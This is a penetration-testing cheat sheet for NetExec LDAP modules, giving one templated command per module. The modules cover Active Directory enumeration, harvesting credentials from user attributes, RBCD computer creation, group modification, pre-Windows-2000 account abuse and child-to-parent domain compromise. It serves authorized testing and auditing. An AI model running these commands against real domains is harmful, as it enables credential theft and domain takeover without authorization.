# NetExec LDAP Modules

## nxc ldap modules

### adcs

Find PKI Enrollment Services in AD and list certificate template names. Cheap pre-flight before reaching for certipy.

```sh title:"NetExec LDAP Modules Find ADCS CAs and template names via LDAP"
nxc ldap $domain -u $user $auth_flags -M adcs
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### badsuccessor

Check if the domain is vulnerable to the badSuccessor primitive (dMSA migration takeover).

```sh title:"NetExec LDAP Modules Check vulnerability to badSuccessor dMSA takeover"
nxc ldap $domain -u $user $auth_flags -M badsuccessor
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### certipy-find

Run certipy `find` from inside nxc with options to export results to text/csv/json. Defaults to vulnerable templates only.

```sh title:"NetExec LDAP Modules Run certipy find via nxc, default to vulnerable templates"
nxc ldap $domain -u $user $auth_flags -M certipy-find
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### dns-nonsecure

Detect ADIDNS zones that allow nonsecure dynamic updates. Anyone authenticated can write records into a nonsecure zone.

```sh title:"NetExec LDAP Modules ADIDNS zones with nonsecure dynamic updates"
nxc ldap $domain -u $user $auth_flags -M dns-nonsecure
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### dump-computers

Dump FQDN and OS for every computer in the domain. Quick OS inventory.

```sh title:"NetExec LDAP Modules FQDN + OS for every computer in domain"
nxc ldap $domain -u $user $auth_flags -M dump-computers
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### entra-id

Find the Entra ID sync server. High-value box because it holds the AD Connect MSOL credential.

```sh title:"NetExec LDAP Modules Find Entra ID Connect sync server (MSOL credential host)"
nxc ldap $domain -u $user $auth_flags -M entra-id
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### find-computer

Find computer objects matching a text fragment. Faster than crafting a custom LDAP query when you just want a name match.

```sh title:"NetExec LDAP Modules Find computers matching free-text fragment"
nxc ldap $domain -u $user $auth_flags -M find-computer -o NAME=$search
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var search
-->

### get-scriptpath

Pull the `scriptPath` attribute from every user. Logon scripts on SYSVOL sometimes contain creds or pointers to interesting shares.

```sh title:"NetExec LDAP Modules scriptPath for every user (logon-script paths)"
nxc ldap $domain -u $user $auth_flags -M get-scriptpath
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### groupmembership

List groups a specific user belongs to.

```sh title:"NetExec LDAP Modules List groups a specific user belongs to"
nxc ldap $domain -u $user $auth_flags -M groupmembership -o USER=$target_user
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var target_user
-->

### obsolete

Extract obsolete operating systems from LDAP. Out-of-support hosts are immediate vuln candidates.

```sh title:"NetExec LDAP Modules Out-of-support OSes via LDAP, vuln candidate list"
nxc ldap $domain -u $user $auth_flags -M obsolete
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### pso

Read Fine-Grained Password Policies (PSOs). Often laxer than the default policy on legacy/service accounts.

```sh title:"NetExec LDAP Modules Read Fine-Grained Password Policies (PSOs)"
nxc ldap $domain -u $user $auth_flags -M pso
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### sccm

Find SCCM infrastructure published in AD. Pivot point for credential extraction (NAA, OSD, PXE).

```sh title:"NetExec LDAP Modules Find SCCM infra in AD (NAA / OSD / PXE pivot)"
nxc ldap $domain -u $user $auth_flags -M sccm
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### subnets

Enumerate AD Sites and Subnets. Maps the network from AD's perspective without scanning.

```sh title:"NetExec LDAP Modules AD Sites + Subnets, network map without scanning"
nxc ldap $domain -u $user $auth_flags -M subnets
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### whoami

Get details on the authenticated principal (group memberships, attributes).

```sh title:"NetExec LDAP Modules Details on authenticated principal (groups + attrs)"
nxc ldap $domain -u $user $auth_flags -M whoami
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### get-desc-users

Pull the `description` field from every user. Lazy admins sometimes drop passwords here.

```sh title:"NetExec LDAP Modules description field for every user, scan for creds"
nxc ldap $domain -u $user $auth_flags -M get-desc-users
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### get-info-users

Pull the `info` (notes) field from every user. Same hunt as descriptions.

```sh title:"NetExec LDAP Modules info/notes field for every user, scan for creds"
nxc ldap $domain -u $user $auth_flags -M get-info-users
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### get-unixUserPassword

Dump `unixUserPassword` attribute from every user. Often overlooked legacy attribute holding cleartext.

```sh title:"NetExec LDAP Modules unixUserPassword attribute (legacy cleartext store)"
nxc ldap $domain -u $user $auth_flags -M get-unixUserPassword
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### get-userPassword

Dump the `userPassword` attribute from every user. Rarely populated on Windows DCs but high payoff when it is.

```sh title:"NetExec LDAP Modules userPassword attribute (rare but high payoff)"
nxc ldap $domain -u $user $auth_flags -M get-userPassword
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### user-desc

Targeted scan of user descriptions for credential-shaped strings.

```sh title:"NetExec LDAP Modules Scan user descriptions for credential strings"
nxc ldap $domain -u $user $auth_flags -M user-desc
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### add-computer

Add (or delete) a domain computer via SAMR or LDAPS. Required for RBCD and Shadow Credentials when MachineAccountQuota > 0.

```sh title:"NetExec LDAP Modules Add domain computer via SAMR/LDAPS for RBCD"
nxc ldap $domain -u $user $auth_flags -M add-computer -o NAME=$rhost_name PASSWORD=$target_pass
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var rhost_name
var target_pass
-->

### modify-group

Modify group membership for users or computers via LDAP. Usable when you have GenericWrite/GenericAll on the group.

```sh title:"NetExec LDAP Modules Modify group membership via LDAP write rights"
nxc ldap $domain -u $user $auth_flags -M modify-group -o GROUP=$group_name USER=$target_user ACTION=add
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var group_name
var target_user
-->

### pre2k

Identify pre-Windows-2000-compatible computer accounts (default password = lowercase samaccountname) and request TGTs for each.

```sh title:"NetExec LDAP Modules pre-W2k computer accounts, password == samaccountname"
nxc ldap $domain -u $user $auth_flags -M pre2k
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### raisechild (HIGH)

Compromise the parent domain from a child domain via inter-realm trust abuse. Requires DA in the child.

```sh title:"NetExec LDAP Modules Child to parent domain compromise via trust (needs DA)"
nxc ldap $domain -u $user $auth_flags -M raisechild
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

